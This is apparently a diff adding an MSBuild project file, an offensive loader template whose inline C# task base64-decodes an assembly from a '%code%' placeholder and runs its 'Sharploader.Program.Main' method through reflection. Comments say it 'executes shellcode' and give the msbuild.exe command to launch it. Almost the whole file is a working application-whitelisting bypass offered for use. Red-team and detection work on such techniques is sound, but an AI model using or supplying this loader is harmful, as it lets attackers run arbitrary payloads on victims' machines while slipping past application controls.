@@ -1,0 +1,59 @@
+ <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+         <!-- This inline task executes shellcode. -->
+         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
+         <!-- Save This File And Execute The Above Command -->
+         <!-- Author: Casey Smith, Twitter: @subTee -->
+         <!-- License: BSD 3-Clause -->
+	  <Target Name="Hello">
+	    <ClassExample />
+	  </Target>
+	  <UsingTask
+	    TaskName="ClassExample"
+	    TaskFactory="CodeTaskFactory"
+	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	    <Task>
+	    
+	      <Code Type="Class" Language="cs">
+	      <![CDATA[
+
+          using System;
+          using System.Diagnostics;
+          using System.Runtime.InteropServices;
+          using System.Net;
+          using System.Text;
+          using System.Threading;
+          using System.IO;
+
+          using Microsoft.Build.Framework;
+          using Microsoft.Build.Utilities;
+
+          public class ClassExample :  Task, ITask
+          {         
+
+           
+          
+
+              public override bool Execute()
+              {
+                  Console.WriteLine("Executing...");  
+                  string x = @"%code%";
+                  var a = System.Reflection.Assembly.Load(Convert.FromBase64String(x));
+                  Type type = a.GetType("Sharploader.Program");
+                  Console.WriteLine(String.Format("[+] Found and Loaded type {0} from code", type));
+                  object instance = Activator.CreateInstance(type);
+                  object[] additional_args = new object[] { };
+                  try {
+                      type.GetMethod("Main").Invoke(instance, additional_args);
+                  } catch (Exception e) { Console.WriteLine("[-] Error loading assembly!\n\n{0}", e); }
+                                return true;
+              } 
+
+
+
+          }  
+     
+	      ]]>
+	      </Code>
+	    </Task>
+	  </UsingTask>
+	</Project>
